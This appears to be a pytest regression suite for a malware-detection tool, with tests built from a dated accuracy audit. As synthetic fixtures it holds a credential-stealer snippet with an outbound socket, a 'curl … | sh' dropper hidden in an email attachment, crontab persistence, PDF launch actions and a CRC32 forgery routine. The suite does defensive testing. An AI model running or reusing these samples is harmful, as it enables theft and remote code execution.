"""Regression tests for the 2026-11-24 accuracy audit
(validation/ACCURACY-AUDIT.md). One test per proven defect, each
derived from the audit's own probe, so the defect can never silently
return. Synthetic material only. See validation/FIX-LOG-2026-11-24.md
for the per-defect fix notes and before/after probe results."""
import base64 as b64
import io
import os
import shutil
import struct
import subprocess
import sys
import tarfile
import zipfile
import zlib

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from event_zero.analyzer import analyze
from event_zero.families import script_line_ledger
from event_zero.verdict import (classify_diff, enumerate_subject,
                                external_contacts, kms_baseline, verdict,
                                _ip_is_local, _region_capability_check)
from event_zero.virt import analyze_virtualization, _section_matches


def write(tmp_path, name, data, sub=""):
    d = tmp_path / sub if sub else tmp_path
    d.mkdir(parents=True, exist_ok=True)
    p = d / name
    p.write_bytes(data if isinstance(data, bytes) else data.encode())
    return str(p)


def pe_with_body(body, extra_strings=b"", section=b".text"):
    dos = bytearray(0x80); dos[0:2] = b"MZ"; struct.pack_into("<I", dos, 0x3c, 0x80)
    coff = struct.pack("<HHIIIHH", 0x8664, 1, 0, 0, 0, 240, 0x22)
    opt = bytearray(240); struct.pack_into("<H", opt, 0, 0x20b); struct.pack_into("<I", opt, 16, 0x1000)
    sec = bytearray(40); sec[0:len(section)] = section; struct.pack_into("<IIII", sec, 8, 100, 0x1000, 512, 512)
    b = (body + extra_strings).ljust(512, b"\x00")
    return bytes(dos) + b"PE\x00\x00" + coff + bytes(opt) + bytes(sec) + b


STEALER = '''import sqlite3, socket
TARGETS = ["Login Data", "Web Data", "Local State", "wallet.dat", "Telegram Desktop\\\\tdata", "recentservers.xml"]
UNLOCK = "CryptUnprotectData"
QUERY = "SELECT * FROM logins"
s = socket.socket()
s.connect(("198.51.100.9", 9001))
'''
ARTICLE = """Banking trojans in the news, explained for readers. Article 0.
Security reporters this week described stealers that watch for banking sites.
The article mentions several banks by name for context:
Bank of America (bankofamerica.com), JPMorgan Chase (chase.com),
Wells Fargo (wellsfargo.com), and Citibank (citi.com) were all named in vendor blogs.
No code is included in this article; it is reporting, not software.
"""
WALLET = "4B" + "1" * 93


# ---- audit defect 1: patch evidence alone must never earn NO ----
def test_defect1_lone_binary_patch_signals_never_no(tmp_path):
    body = b"\x90" * 12 + b"\x31\xc0\xc3" * 4
    p = write(tmp_path, "game_crack.exe", pe_with_body(body, b"license check\x00cracked\x00"))
    v = verdict(p)
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    # the signals are still collected, as annotation only
    assert v["files"][0]["patch_evidence"]


@pytest.mark.skipif(not shutil.which("gcc"), reason="gcc not available")
def test_defect1_gcc_hello_never_no(tmp_path):
    src = write(tmp_path, "hello.c",
                '#include <stdio.h>\nint main(){ const char *s = "license check routine"; printf("%s: hello\\n", s); return 0; }\n')
    exe = str(tmp_path / "hello")
    assert subprocess.run(["gcc", "-O2", "-o", exe, src]).returncode == 0
    v = verdict(exe)
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED", v["files"][0]["why"]


# ---- audit defect 2: the 2,000-string cap must not hide late evidence ----
def test_defect2_wallet_position_does_not_change_verdict(tmp_path):
    filler = [f'F{i:04d} = "filler string {i} aaaa bbbb cccc"' for i in range(2100)]
    head = ['POOL = "stratum+tcp://pool.example.invalid:3333"',
            'LAUNCH = "start -WindowStyle Hidden so nobody sees it"']
    late = "\n".join(head + filler + [f'WALLET = "{WALLET}"']) + "\n"
    early = "\n".join(head + [f'WALLET = "{WALLET}"'] + filler) + "\n"
    pl = write(tmp_path, "miner_late.py", late)
    pe = write(tmp_path, "miner_early.py", early)
    # judgement inputs are uncapped now
    assert analyze(pl)["strings"]["count"] > 2000
    vl, ve = verdict(pl), verdict(pe)
    assert vl["headline"] == ve["headline"] == "YES: MALWARE FOUND"
    assert vl["reason_class"] == ve["reason_class"] == "PROVEN"


# ---- audit defect 3: script source past 20,000 chars is judged ----
def test_defect3_long_script_fully_ledgered(tmp_path):
    head = ['# benign looking helper', 'import os, socket'] + [f'VALUE_{i} = {i}' for i in range(30)]
    fill = [f'# filler comment line {i} padding padding padding pad' for i in range(420)]
    tail = ['s = socket.socket()', 'result = s.connect(("198.51.100.9", 9001))',
            'os.system("crontab -l | { cat; echo @reboot /tmp/x; } | crontab -")']
    source = "\n".join(head + fill + tail) + "\n"
    assert len(source) > 20000
    p = write(tmp_path, "long_helper.py", source)
    v = verdict(p)
    assert v["reason_class"] == "PROVEN"
    ledger = v["files"][0]["script_ledger"]
    # the ledger covers the whole source, not a capped window
    assert ledger["lines"] == len(source.splitlines())
    assert any(f["kind"].startswith("persistence") for f in ledger["flagged"])


# ---- audit defect 4: the ledger gate applies to every script ----
def test_defect4_unaccounted_line_blocks_no_for_any_script(tmp_path):
    patcher = ('# patcher: flips the licence byte in the game binary\n'
               'import os\n'
               'data = open("game.exe", "rb").read()\n'
               'patched = data.replace(b"\\x74\\x12", b"\\xeb\\x12")\n'
               'frobnicate_the_wibbulator(patched)\n'
               'print("patched")\n')
    v = verdict(write(tmp_path, "patcher.py", patcher))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert any("frobnicate_the_wibbulator" in u for u in v["unaccounted"])


def test_defect4_defined_function_call_is_accounted(tmp_path):
    # a call to a function defined in the same file adds no behaviour
    # the ledger has not already classified line by line
    ledger = script_line_ledger("def main():\n    print('patching')\nmain()\n")
    assert ledger["unaccounted"] == []
    script = "def main():\n    print('patching')\nmain()\n"
    v = verdict(write(tmp_path, "tool.py", script))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]


# ---- audit defect 5: document active content and email attachments ----
def test_defect5_pdf_active_content_blocks_no(tmp_path):
    pdf = (b"%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n"
           b"2 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj\n"
           b"3 0 obj << /S /Launch /F (evil.exe) >> endobj\n%%EOF")
    v = verdict(write(tmp_path, "doc.pdf", pdf))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert any("active content" in u for u in v["unaccounted"])


def test_defect5_eml_attachments_are_entries(tmp_path):
    dropper = 'import os\nos.system("curl http://drop.example/payload.sh | sh")\n'
    eml = ("From: Bad <bad@example.com>\r\nSubject: Invoice\r\nMIME-Version: 1.0\r\n"
           "Content-Type: multipart/mixed; boundary=BB\r\n\r\n--BB\r\n"
           "Content-Type: text/plain\r\n\r\nsee attached\r\n--BB\r\n"
           "Content-Type: text/x-python; name=evil.py\r\n"
           "Content-Disposition: attachment; filename=evil.py\r\n"
           "Content-Transfer-Encoding: base64\r\n\r\n" +
           b64.b64encode(dropper.encode()).decode() + "\r\n--BB--\r\n")
    v = verdict(write(tmp_path, "mail.eml", eml))
    rels = [f["path_in_release"] for f in v["files"]]
    assert "mail.eml!evil.py" in rels
    assert v["reason_class"] == "PROVEN"


# ---- audit defect 6: KMS baseline is content based, addresses are real ----
KMS_PAIR_BODY = ('import socket\n'
                 '# renewal is handled by schtasks on the host\n'
                 'addr = ("172.217.14.206", 443)\n'
                 's = socket.socket()\n'
                 'result = s.connect(addr)\n'
                 'print("done")\n')


def test_defect6_kms_name_pair_same_verdict(tmp_path):
    v1 = verdict(write(tmp_path, "kms_activator.py", KMS_PAIR_BODY))
    v2 = verdict(write(tmp_path, "renewal_tool.py", KMS_PAIR_BODY))
    assert v1["headline"] == v2["headline"]
    assert v1["reason_class"] == v2["reason_class"]


def test_defect6_baseline_ignores_filename_and_bare_port_digits(tmp_path):
    # a benign script named like an activator, with the digits 1688 in
    # an innocent counter, carries no KMS content markers at all
    body = "COUNT = 1688\nprint('export finished')\n"
    p = write(tmp_path, "kms_activator.py", body)
    assert kms_baseline(analyze(p)) is False


def test_defect6_external_address_test():
    assert _ip_is_local("172.217.14.206") is False   # public (Google)
    assert _ip_is_local("172.16.0.1") is True        # 172.16.0.0/12 is private
    assert _ip_is_local("192.168.1.5") is True
    assert _ip_is_local("127.0.0.1") is True
    rep = {"iocs": {"urls": [], "ip_addresses": [], "domains": ["evil.example.org", "nas.local", "localhost"]}}
    assert external_contacts(rep) == ["evil.example.org"]


# ---- audit defect 7: flag-flip needs license context; region check bites ----
def test_defect7_settings_change_is_not_a_license_flag_flip(tmp_path):
    old = b"# settings for the tool\nLIMIT = 1000\nRETRIES = 3\n"
    new = b"# settings for the tool\nLIMIT = 9999\nRETRIES = 3\n"
    led = classify_diff(old, new, [], [])
    assert not any(e["classification"] == "expected-crack" for e in led)
    gen = write(tmp_path, "settings.py", old.decode(), "genuine7")
    rel = write(tmp_path, "settings.py", new.decode(), "release7")
    v = verdict(os.path.dirname(rel), reference=os.path.dirname(gen))
    assert v["headline"] != "NO: NO MALWARE"


def test_defect7_region_capability_check_not_vacuous():
    # a conditional jump flipped to a call to a new target is added
    # behaviour, however patch-shaped the region looks
    passed, _caps, added = _region_capability_check(b"\x74\x12", b"\xe8\x10\x00\x00\x00", 0, 2, 0, 5)
    assert passed is False and any("control-flow" in a for a in added)
    # a region where nothing can be profiled at all fails the check:
    # a check that examined nothing is not a pass
    passed2, _c2, added2 = _region_capability_check(b"", b"", 0, 0, 0, 0)
    assert passed2 is False and any("could not be profiled" in a for a in added2)


# ---- audit defect 8 (task 8): failed containers are never PROVEN ----
def test_defect8_failed_container_never_proven(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        z.writestr("evil.py", STEALER)
    zdata = bytearray(buf.getvalue())
    cd = zdata.find(b"PK\x01\x02")
    zdata[cd + 16] ^= 0xFF
    v = verdict(write(tmp_path, "bundle.zip", bytes(zdata)))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert v["files"][0]["verdict"] == "YES: UNACCOUNTED"


# ---- audit defect 9 (task 9): tar is a container like zip ----
def test_defect9_banking_article_tar(tmp_path):
    tbuf = io.BytesIO()
    with tarfile.open(fileobj=tbuf, mode="w") as tf:
        payload = ARTICLE.encode()
        info = tarfile.TarInfo("banking_article_0.txt"); info.size = len(payload)
        tf.addfile(info, io.BytesIO(payload))
    v = verdict(write(tmp_path, "article.tar", tbuf.getvalue()))
    assert v["headline"] == "NO: NO MALWARE", v["unaccounted"]
    by_rel = {f["path_in_release"]: f["verdict"] for f in v["files"]}
    assert by_rel["article.tar"] == "NO: ACCOUNTED"
    assert by_rel["article.tar!banking_article_0.txt"] == "NO: ACCOUNTED"


# ---- audit defect 14 (task 10): firmware flags reach the verdict ----
def test_defect10_firmware_smm_network_blocks_no(tmp_path):
    fw = bytearray(0x2000); fw[40:44] = b'_FVH'; fw[0x100:0x104] = b'hsqs'
    pe = pe_with_body(b"\x90" * 10, b" TcpDxe Network SmmAccess")
    fw[0x800:0x800 + len(pe)] = pe
    p = write(tmp_path, "fw.bin", bytes(fw))
    rep = analyze(p)
    assert any(f["name"] == "SMM driver with network protocol access"
               for f in rep["firmware"]["red_flags"])
    v = verdict(p)
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert any("SMM" in u for u in v["unaccounted"])


# ---- audit defect 10 (task 11): installers inside folders are installers ----
def test_defect11_installer_in_folder_unaccounted(tmp_path):
    inst = pe_with_body(b"\x90" * 8, b"Inno Setup\x00")
    write(tmp_path, "setup.exe", inst, "release11")
    v = verdict(str(tmp_path / "release11"))
    by_rel = {f["path_in_release"]: f["verdict"] for f in v["files"]}
    assert by_rel["setup.exe"] == "YES: UNACCOUNTED"
    assert v["reason_class"] == "UNACCOUNTED"


# ---- audit defect 11 (task 12): CRC32 and MD5 manifest matches are weak ----
def _crc32_forge_suffix(data, target):
    base = zlib.crc32(data + b"\x00\x00\x00\x00") & 0xffffffff
    cols = []
    for i in range(32):
        suf = bytearray(4); suf[i // 8] = 1 << (i % 8)
        cols.append((zlib.crc32(data + bytes(suf)) & 0xffffffff) ^ base)
    rhs = target ^ base
    rows = []
    for j in range(32):
        row = 0
        for i in range(32):
            if (cols[i] >> j) & 1:
                row |= (1 << i)
        rows.append([row, (rhs >> j) & 1])
    piv = []; r = 0
    for c in range(32):
        pr = None
        for k in range(r, 32):
            if (rows[k][0] >> c) & 1:
                pr = k; break
        if pr is None:
            continue
        rows[r], rows[pr] = rows[pr], rows[r]
        for k in range(32):
            if k != r and ((rows[k][0] >> c) & 1):
                rows[k][0] ^= rows[r][0]; rows[k][1] ^= rows[r][1]
        piv.append(c); r += 1
    x = 0
    for idx, c in enumerate(piv):
        if rows[idx][1]:
            x |= (1 << c)
    suf = bytearray(4)
    for i in range(32):
        if (x >> i) & 1:
            suf[i // 8] |= (1 << (i % 8))
    assert zlib.crc32(data + bytes(suf)) & 0xffffffff == target
    return bytes(suf)


def test_defect12_crc32_sfv_match_is_weak_only(tmp_path):
    genuine = pe_with_body(b"\x90" * 4, b"hello genuine build\x00")
    crc = format(zlib.crc32(genuine) & 0xffffffff, "08x")
    other = pe_with_body(b"\x90" * 4, b"a different build entirely\x00")
    forged = other + _crc32_forge_suffix(other, int(crc, 16))
    sfv = write(tmp_path, "release.sfv", f"app.exe {crc}\n")
    v = verdict(write(tmp_path, "app.exe", forged), reference=sfv)
    assert v["files"][0]["reference"] == "manifest-match-weak"
    assert v["headline"] != "NO: NO MALWARE"


# ---- audit defect 15 (task 13): section matching has boundaries ----
def test_defect13_section_match_boundaries():
    assert _section_matches(".plt.sec", ".se") is False
    assert _section_matches(".se", ".se") is True
    assert _section_matches(".vmp0", ".vmp") is True
    assert _section_matches(".themida", ".themida") is True


@pytest.mark.skipif(not shutil.which("gcc"), reason="gcc not available")
def test_defect13_gcc_elf_not_flagged_safengine(tmp_path):
    src = write(tmp_path, "hello.c", '#include <stdio.h>\nint main(){ printf("hello\\n"); return 0; }\n')
    exe = str(tmp_path / "hello")
    assert subprocess.run(["gcc", "-O2", "-o", exe, src]).returncode == 0
    raw = open(exe, "rb").read()
    rep = analyze(exe)
    virt = analyze_virtualization(raw, rep["strings"]["all"], rep["sections"], "hello")
    assert virt["detected"] is False


# ---- audit defect 17 (task 14): extraction names are deterministic ----
def test_defect14_extraction_dir_deterministic(tmp_path):
    zbuf = io.BytesIO()
    with zipfile.ZipFile(zbuf, "w") as z:
        z.writestr("a.txt", "hello\n")
    zp = write(tmp_path, "det.zip", zbuf.getvalue())
    names = []
    for seed in ("0", "1"):
        code = ("import os, sys, tempfile; sys.path.insert(0, %r);"
                "from event_zero.verdict import enumerate_subject;"
                "td = tempfile.mkdtemp(); enumerate_subject(%r, td);"
                "print(sorted(os.listdir(td)))") % (
                    os.path.join(os.path.dirname(__file__), ".."), zp)
        env = dict(os.environ, PYTHONHASHSEED=seed)
        out = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, env=env)
        names.append(out.stdout.strip())
    assert names[0] == names[1] and "extract_0_" in names[0]


# ---- audit defect 18 (task 15): caps record markers that block NO ----
def test_defect15_truncation_markers_recorded_and_block(tmp_path):
    big = "\n".join(f'VALUE_{i} = {i}' for i in range(1200)) + "\n"
    assert len(big) > 16384
    p = write(tmp_path, "big_config.py", big)
    rep = analyze(p)
    assert rep["truncations"], "the entropy coverage cap must be recorded"
    v = verdict(p)
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert any("truncated" in u for u in v["unaccounted"])


def test_defect15_small_files_unaffected(tmp_path):
    small = 'LIMIT = 10\nprint("ok")\n'
    p = write(tmp_path, "small.py", small)
    assert analyze(p)["truncations"] == []
    v = verdict(p)
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]


# ---- audit defect 16 (task 16): single-file installer table agrees ----
def test_defect16_single_installer_entry_matches_headline(tmp_path):
    inst = pe_with_body(b"\x90" * 8, b"Inno Setup\x00")
    v = verdict(write(tmp_path, "setup.exe", inst))
    assert v["files"][0]["verdict"] == "YES: UNACCOUNTED"
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
